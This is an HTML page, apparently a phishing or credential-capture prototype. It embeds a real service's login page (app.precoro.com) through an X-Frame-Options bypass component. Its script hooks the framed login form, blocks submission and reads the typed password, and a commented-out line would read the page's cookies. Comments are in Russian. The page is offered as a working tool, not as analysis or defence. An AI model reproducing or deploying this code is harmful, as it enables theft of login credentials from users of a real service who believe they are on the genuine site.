<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="X-Frame-Bypass: Web Component extending IFrame to bypass X-Frame-Options: deny/sameorigin">
	<title>X-Frame-Bypass Web Component Demo</title>
	<style>
		html, body {
			margin: 0;
			padding: 0;
			height: 100%;
			overflow: hidden;
		}
		iframe {
			display: block;
			width: calc(100% - 40px);
			height: calc(100% - 40px);
			margin: 20px;
		}
		img {
			position: absolute;
			top: 0;
			right: 0;
		}
	</style>
	<script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
	<script src="x-frame-bypass.js" type="module"></script>
</head>
<body>
	<iframe is="x-frame-bypass" src="https://app.precoro.com/login" class="asd"></iframe>

	<script>
        // Функция для выполнения кода внутри iframe после его загрузки
        function manipulateIframeContent() {
            // Получаем доступ к iframe
		var iframe = document.querySelector('.asd');

            // Проверяем, загрузился ли iframe
            if (iframe && iframe.contentWindow) {
                // Получаем доступ к содержимому iframe
                var iframeDocument = iframe.contentWindow.document;

                // Пример: Изменяем текст заголовка <h1> в iframe
 		//var header = iframeDocument.querySelector('h2');
		var login_form = iframeDocument.getElementById('login_form')
		var pass_value = iframeDocument.getElementById('password')
		    
		login_form.addEventListener('submit', function(event) {
        		event.preventDefault(); // Prevent the form from submitting

        		// Get the input value
        		const inputValue = pass_value.value;

        		// Now you can use 'inputValue' as needed
        		alert('Input value:', inputValue);
    		});
		    
		     
               // if (value) {
                    //header.textContent = "Hello from the parent page!";
			//alert(iframeDocument.cookie)
			//alert(value)
                //}
            }
        }

        // Ожидаем, пока iframe загрузится, и затем вызываем функцию
        document.querySelector('.asd').addEventListener('load', manipulateIframeContent);
    </script>
</body>
</html>
